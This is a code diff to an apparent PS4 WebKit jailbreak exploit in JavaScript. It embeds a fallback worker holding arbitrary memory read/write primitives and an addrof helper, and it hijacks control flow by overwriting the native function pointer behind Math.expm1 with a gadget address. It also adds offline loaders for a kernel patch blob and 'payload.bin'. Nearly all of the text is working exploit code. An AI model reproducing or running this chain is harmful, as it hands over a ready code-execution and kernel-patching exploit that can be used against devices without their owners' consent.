@@ -7,7 +7,57 @@ const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
 
+
+// --- 100% Offline Robust Helpers for PS4 WebKit AppCache ---
+const RPC_WORKER_FALLBACK = "\"use strict\";\n\nlet marker_arr = new Uint32Array(new ArrayBuffer(0x10));\n\nconst transfer = [];\n\nlet leakObj = null;\nlet master = null;\nlet victim = null;\n\nlet leakLo = 0, leakHi = 0;\nlet wired = false;\n\nlet pivotObj = null;\nlet execLo = 0, execHi = 0;\nlet origLo = 0, origHi = 0;\nlet armed = false;\n\nconst VECTOR_OFF = 0x10;\nconst INLINE_OFF = 0x10;\nconst M_FUNCTION = 0x28;\nconst EXECUTABLE = 0x18;\n\nfunction view(lo, hi) {\n    if (!wired) throw new Error(\"worker arw is not wired yet\");\n    master[VECTOR_OFF / 4] = lo >>> 0;\n    master[VECTOR_OFF / 4 + 1] = hi >>> 0;\n    return victim;\n}\n\nfunction at(a, n) {\n    const l = (a[0] >>> 0) + n;\n    return l > 0xffffffff\n        ? [(l - 0x100000000) >>> 0, (a[1] + 1) >>> 0]\n        : [l >>> 0, a[1] >>> 0];\n}\nfunction rd8(lo, hi) {\n    const dv = view(lo, hi);\n    return [dv.getUint32(0, true), dv.getUint32(4, true)];\n}\nfunction wr8(lo, hi, vlo, vhi) {\n    const dv = view(lo, hi);\n    dv.setUint32(0, vlo >>> 0, true);\n    dv.setUint32(4, vhi >>> 0, true);\n}\nfunction addrofRaw(obj) {\n    leakObj.obj = obj;\n    const dv = view(leakLo, leakHi);\n    const a = [dv.getUint32(INLINE_OFF, true), dv.getUint32(INLINE_OFF + 4, true)];\n    leakObj.obj = null;\n    return a;\n}\n\nconst api = {\n    ping() {\n        return \"pong\";\n    },\n\n    init(sentLo, sentHi) {\n        leakObj = { obj: null };\n        master = new Uint32Array(6);\n        victim = new DataView(new ArrayBuffer(0x30));\n\n        marker_arr[0] = sentLo >>> 0;\n        marker_arr[1] = sentHi >>> 0;\n        marker_arr[2] = 0x5a5a5a5a;\n        marker_arr[3] = 0xa5a5a5a5;\n\n        marker_arr.leak = leakObj;\n        marker_arr.master = master;\n        marker_arr.victim = victim;\n\n        transfer.push(marker_arr.buffer);\n        return marker_arr;\n    },\n\n    setup(lo, hi) {\n        pivotObj = {};\n        leakLo = lo >>> 0;\n        leakHi = hi >>> 0;\n        wired = true;\n\n        const dv = view(leakLo, leakHi);\n        const h0 = dv.getUint32(0, true), h1 = dv.getUint32(4, true);\n        if (h0 === 0 && h1 === 0) {\n            wired = false;\n            throw new Error(\"leak cell header reads zero -- the wire did not take\");\n        }\n        return [h0, h1];\n    },\n\n    readU32(lo, hi, count) {\n        if (count < 1 || count * 4 > 0x30) throw new Error(\"count out of range\");\n        const dv = view(lo, hi);\n        const out = [];\n        for (let i = 0; i < count; ++i) out.push(dv.getUint32(i * 4, true));\n        return out;\n    },\n\n    writeU32(lo, hi, values) {\n        if (values.length * 4 > 0x30) throw new Error(\"too many values\");\n        const dv = view(lo, hi);\n        for (let i = 0; i < values.length; ++i)\n            dv.setUint32(i * 4, values[i] >>> 0, true);\n        return values.length;\n    },\n\n    addrof(which) {\n        return addrofRaw(which === \"master\" ? master\n            : which === \"victim\" ? victim\n            : which === \"leak\" ? leakObj\n            : which === \"pivot\" ? pivotObj\n            : which === \"expm1\" ? Math.expm1\n            : marker_arr);\n    },\n\n    armPivot(g0lo, g0hi) {\n        if (armed) throw new Error(\"already armed\");\n        const fn = addrofRaw(Math.expm1);\n        const exAt = at(fn, EXECUTABLE);\n        const ex = rd8(exAt[0], exAt[1]);\n        if (ex[0] === 0 && ex[1] === 0)\n            throw new Error(\"expm1 executable pointer reads zero\");\n        execLo = ex[0]; execHi = ex[1];\n\n        const mf = at([execLo, execHi], M_FUNCTION);\n        const orig = rd8(mf[0], mf[1]);\n        if (orig[0] === 0 && orig[1] === 0)\n            throw new Error(\"expm1 m_function reads zero\");\n        origLo = orig[0]; origHi = orig[1];\n\n        wr8(mf[0], mf[1], g0lo, g0hi);\n        const back = rd8(mf[0], mf[1]);\n        if ((back[0] >>> 0) !== (g0lo >>> 0) || (back[1] >>> 0) !== (g0hi >>> 0)) {\n            wr8(mf[0], mf[1], origLo, origHi);\n            throw new Error(\"m_function did not take the write\");\n        }\n        armed = true;\n        return { exec: [execLo, execHi], orig: [origLo, origHi] };\n    },\n\n    fire(sLo, sHi) {\n        if (!armed) throw new Error(\"pivot is not armed\");\n        const pa = addrofRaw(pivotObj);\n        const saved = rd8(pa[0], pa[1]);\n        wr8(pa[0], pa[1], sLo, sHi);\n        Math.expm1(pivotObj);\n        wr8(pa[0], pa[1], saved[0], saved[1]);\n        return true;\n    },\n\n    disarm() {\n        if (!armed) return { restored: false, expm1: null };\n        const mf = at([execLo, execHi], M_FUNCTION);\n        wr8(mf[0], mf[1], origLo, origHi);\n        const back = rd8(mf[0], mf[1]);\n        armed = false;\n        const ok = (back[0] >>> 0) === (origLo >>> 0)\n                && (back[1] >>> 0) === (origHi >>> 0);\n        return { restored: ok, mFunction: back, expm1: Math.expm1(1) };\n    },\n\n    release() {\n        marker_arr = null;\n        return true;\n    },\n};\n\nself.onmessage = function (e) {\n    const d = e.data || {};\n    const id = d.id, name = d.name, args = d.args || [];\n    let out;\n    try {\n        const fn = api[name];\n        if (typeof fn !== \"function\") throw new Error(\"unknown function \" + name);\n        out = { id: id, type: \"ret\", value: fn.apply(api, args) };\n    } catch (err) {\n        out = { id: id, type: \"err\", value: (err && err.message) ? err.message : String(err) };\n    }\n    if (transfer.length) {\n        self.postMessage(out, transfer);\n        transfer.length = 0;\n    } else {\n        self.postMessage(out);\n    }\n};\n";
+
+function createRpcWorker() {
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", "rpc_worker.js", false);
+        xhr.send();
+        if ((xhr.status === 200 || xhr.status === 0) && xhr.responseText && xhr.responseText.length > 50) {
+            const blob = new Blob([xhr.responseText], { type: "application/javascript" });
+            return new Worker(URL.createObjectURL(blob));
+        }
+    } catch (e) { }
+
+    const blob = new Blob([RPC_WORKER_FALLBACK], { type: "application/javascript" });
+    return new Worker(URL.createObjectURL(blob));
+}
+
+async function loadBinaryBlob(url) {
+    if (!url) return null;
+    try {
+        const rsp = await fetch(url);
+        if (rsp && (rsp.ok || rsp.status === 0)) {
+            const buf = await rsp.arrayBuffer();
+            if (buf && buf.byteLength > 0) return new Uint8Array(buf);
+        }
+    } catch (e) { }
+
+    return new Promise((resolve) => {
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.responseType = "arraybuffer";
+            xhr.onload = () => {
+                if ((xhr.status === 200 || xhr.status === 0) && xhr.response && xhr.response.byteLength > 0) {
+                    resolve(new Uint8Array(xhr.response));
+                } else {
+                    resolve(null);
+                }
+            };
+            xhr.onerror = () => resolve(null);
+            xhr.send();
+        } catch (e) {
+            resolve(null);
+        }
+    });
+}
+
 function post(tag, detail) {
+    if (typeof navigator !== "undefined" && !navigator.onLine) return;
     try {
         const x = new XMLHttpRequest();
         x.open("POST", "t", true);
@@ -214,8 +264,7 @@ function makeRpc(worker) {
         let kpatch = null;
         try {
             if (kpatchName) {
-                const rsp = await fetch(kpatchName);
-                if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
+                kpatch = await loadBinaryBlob(kpatchName);
             }
         } catch (e) {
             mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
@@ -241,8 +290,7 @@ function makeRpc(worker) {
 
         let payload = null;
         try {
-            const prsp = await fetch("payload.bin");
-            if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
+            payload = await loadBinaryBlob("payload.bin");
         } catch (e) {
             mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
         }
@@ -686,7 +734,7 @@ function makeRpc(worker) {
             })() + " are available to this process)");
 
         state("wiring the worker...", "warn");
-        worker = new Worker("rpc_worker.js");
+        worker = createRpcWorker();
         rpc = makeRpc(worker);
         await rpc("ping");
         const markerArr = await rpc("init", SENT_LO, SENT_HI);
